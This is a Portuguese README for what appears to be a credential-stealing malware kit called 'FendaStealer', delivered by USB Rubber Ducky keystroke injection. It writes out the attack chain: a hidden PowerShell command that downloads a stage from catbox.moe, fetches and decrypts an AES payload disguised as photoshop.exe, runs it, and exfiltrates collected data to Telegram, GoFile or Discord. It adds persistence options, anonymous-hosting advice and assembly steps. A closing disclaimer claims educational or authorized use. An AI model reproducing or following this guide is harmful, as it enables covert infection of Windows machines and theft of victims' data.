# Rubber Ducky — payloads FendaStealer

Esta pasta contém os payloads de **keystroke injection** para o **USB Rubber Ducky (Hak5)**,
usados para entregar o `fendastealer` num alvo Windows via um comando curto no `Win+R`.

## Arquivos

| Arquivo | O que é |
|---|---|
| `make_ducky_payload.py` | gerador de payloads (modos exe / zip / blob / aes) |
| `EXEMPLO_TESTE.txt` | template do payload de **teste** (`--test`, sem persistência) |
| `EXEMPLO_FINAL.txt` | template do payload **oficial** (persistência + delay) |
| `stage_aes.ps1` / `stage_aes_test.ps1` | stages reais (locais, com URL/senha — **não commitar**) |

> Os payloads reais (`TESTE.*`, `FINAL.*`) e os stages reais ficam **fora do git**
> (`.gitignore`), porque contêm URLs e senha da infraestrutura.

## Por que usamos o **catbox.moe**

O Rubber Ducky só **digita teclas** — ele não carrega arquivo. Então o payload precisa
apontar pra uma **URL de download direto** que a máquina-alvo consegue baixar. O
**catbox.moe** é o hoster escolhido porque:

- **Gratuito e anônimo** (sem conta, sem login, sem ligação com a sua identidade);
- Dá **link direto** (`https://files.catbox.moe/XXXX`) sem página intermediária, JS ou captcha —
  perfeito pra `curl.exe` / `WebClient`;
- Limite de **200 MB** (o nosso `.aes` tem ~51 MB);
- Aceita upload por **API** simples (um `curl -F`).

## Fluxo (resumo)

```
Ducky digita:  powershell -w hidden -c "...DownloadString('STAGE_URL')"
   └─> baixa o stage (.ps1) do catbox
         └─> curl baixa o .aes do catbox
               └─> decripta AES-256 (senha) -> photoshop.exe
                     └─> executa -> coleta -> exfiltra (Telegram/GoFile/Discord)
```

## Como subir arquivos no catbox

```powershell
# qualquer arquivo (o stage .ps1, o .aes, etc.)
curl.exe -F "reqtype=fileupload" -F "fileToUpload=@caminho\arquivo" https://catbox.moe/user/api.php
# retorna: https://files.catbox.moe/XXXX.<ext>
```

## Como montar o payload final

1. Suba o `.aes` (gerado com `make_ducky_payload.py --make-aes`) no catbox.
2. Coloque a URL do `.aes` dentro do stage (`$u = 'https://files.catbox.moe/XXXX.aes'`).
3. Suba o stage no catbox e pegue o link.
4. Gere o payload com `make_ducky_payload.py` (ou edite o template) trocando `SUA_URL_STAGE.ps1`.
5. Encode no **https://payloadstudio.hak5.org** → `inject.bin` → microSD do Ducky.

> ⚠️ **Importante (teclado PT-BR/ABNT2):** selecione `Keyboard Layout = Portuguese (Brazil)`
> no Payload Studio. Do contrário os símbolos (`+`, `/`, `=`, `'`, `"`) saem trocados e o
> payload falha. Apóstrofos são "tecla morta" no ABNT2 — evite-os no comando digitado.

## Aviso

Uso **exclusivamente educacional / pentest autorizado**. Não use contra sistemas sem
autorização por escrito.
